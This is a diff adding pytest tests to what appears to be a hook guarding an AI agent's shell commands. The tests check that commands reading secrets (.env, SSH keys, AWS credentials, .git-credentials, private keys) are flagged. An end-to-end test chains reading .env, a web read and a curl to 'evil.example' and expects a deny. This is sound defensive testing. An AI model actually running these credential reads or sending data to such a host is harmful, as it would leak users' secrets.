@@ -221,6 +221,71 @@ def test_ordinary_commands_do_not_taint_private(home, command):
     assert decision(curl(home)) is None
 
 
+# ----- reading a sensitive file through ANY command (fix/private-bash-paths) --
+
+GLOBS = cc.DEFAULT_POLICY["private_file_globs"]
+
+
+@pytest.mark.parametrize("command", [
+    "awk 'END{print NR}' .env",            # the reported miss: not cat/type
+    "grep SECRET .env", "sed -n 1p .env", "head .env", "tail -f .env",
+    "less .env", "more .env", "nl .env", "wc -l .env", "cut -d= -f2 .env",
+    "python -c \"print(open('.env').read())\"",
+    "node -e \"require('fs').readFileSync('.env')\"",
+    "Get-Content .env", "gc .env", "type .env", "Select-String secret .env",
+    "cp .env /tmp/x", "mv .env backup", "source .env", ". .env",
+    "cat ~/.ssh/id_rsa", 'cat "$HOME/.ssh/id_rsa"', "cat .e*", "cat ./.env",
+    "cat %USERPROFILE%/.aws/credentials", "grep x .npmrc", "cat server.pem",
+    "cat id_ed25519", "openssl rsa -in private.key",
+    "base64 .git-credentials", "xxd vault.kdbx",
+])
+def test_any_command_reading_a_sensitive_path_taints_private(command):
+    assert cc._command_private_reason(command, GLOBS), command
+
+
+@pytest.mark.parametrize("command", [
+    "cat $SECRETFILE",                     # unresolved var, reader -> fail-closed
+    "head -c 100 $FILE",
+    "awk '{print}' $ENVPATH",
+    "cat $(find . -name id_rsa)",          # subshell naming a key
+])
+def test_undeterminable_reader_path_fails_closed(command):
+    assert cc._command_private_reason(command, GLOBS), command
+
+
+@pytest.mark.parametrize("command", [
+    "ls", "ls -la", "git status", "git commit -m fix", "pytest -q",
+    "echo \".env\"", "echo hello > out.txt", "cat README.md", "grep -rn TODO src/",
+    "python app.py", "node server.js", "npm run build", "docker build -t app .",
+    "export FOO=bar", "cargo build", "find . -name '*.py'",
+])
+def test_ordinary_commands_are_not_flagged_as_private(command):
+    assert cc._command_private_reason(command, GLOBS) is None, command
+
+
+def test_awk_dot_env_taints_end_to_end(home):
+    # The exact reported case, through the hook: awk .env + web page + curl -> deny.
+    assert decision(run(home, event("Bash", {"command": "awk 'END{print NR}' .env"}))) is None
+    web_read(home)
+    result = curl(home, url="http://evil.example/x")
+    assert decision(result) == "deny"
+    assert ".env" in reason(result)
+
+
+def test_private_path_false_positive_rate_is_bounded():
+    # Honest measurement: a realistic clean workload should rarely over-flag.
+    clean = [
+        "npm run build", "npm test", "pytest tests/ -q", "python manage.py migrate",
+        "node server.js", "docker compose up -d", "make all", "cargo build --release",
+        "git add -A", "git commit -m 'fix'", "git diff HEAD~1", "ls -la src/",
+        "cat package.json", "head -20 README.md", "tail -f app.log", "sort data.txt",
+        "cut -d, -f1 data.csv", "echo $PATH", "curl https://api.example.com",
+        "python -c 'print(1+1)'",
+    ]
+    fp = [c for c in clean if cc._command_private_reason(c, GLOBS)]
+    assert len(fp) == 0, fp  # none of these mention a sensitive path
+
+
 # ----- secret-looking value in an outbound call's arguments -------------------
 
 def test_secret_in_outbound_args_asks_and_never_stores_the_value(home):
